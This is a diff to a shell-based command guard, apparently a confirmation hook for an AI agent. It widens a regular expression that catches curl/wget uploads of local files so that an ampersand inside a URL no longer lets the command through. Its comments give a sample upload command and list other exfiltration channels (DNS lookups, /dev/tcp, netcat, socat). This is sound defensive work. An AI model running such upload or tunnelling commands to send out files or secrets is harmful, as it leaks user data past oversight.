@@ -133,7 +133,9 @@ PATTERN_COMMIT="(^|[;&|(\`'\"${_NL}])[[:space:]]*((env|command|exec|nohup|time|x
 # _FINE_ARG chiude un argomento nella shell (uno spazio) o in una lista python (`'curl', '-d', '@x'`):
 # con il solo spazio un invio da subprocess.run([...]) passava senza conferma (21/10/2026, #3645).
 _FINE_ARG="([[:space:]]|[\"'],[[:space:]]*[\"']?)"
-PATTERN_EXFIL='(curl|wget)[^|;&]*(-F'"$_FINE_ARG"'*[^[:space:]]*@|--form'"$_FINE_ARG"'*[^[:space:]]*@|-T'"$_FINE_ARG"'|--upload-file|--(post|body)-file|-d'"$_FINE_ARG"'*@|--data[a-z-]*'"$_FINE_ARG"'*@)'
+# Un & seguito da un carattere che non è spazio né operatore sta dentro l'URL (`?a=1&b=2`) e non chiude
+# il comando: prima `curl "https://x/?a=1&b=2" -d @file` passava senza conferma (30/10/2026).
+PATTERN_EXFIL='(curl|wget)([^|;&]|&[^[:space:]&|;])*(-F'"$_FINE_ARG"'*[^[:space:]]*@|--form'"$_FINE_ARG"'*[^[:space:]]*@|-T'"$_FINE_ARG"'|--upload-file|--(post|body)-file|-d'"$_FINE_ARG"'*@|--data[a-z-]*'"$_FINE_ARG"'*@)'
 # exfil ramo egress-GET/transport: canali che portano dati fuori SENZA POST e che
 # sfuggivano al pattern sopra — curl/wget GET, DNS-exfil (dig/nslookup/host),
 # /dev/tcp, netcat/socat. exfil-guard.py decide poi con precisione (ask solo su
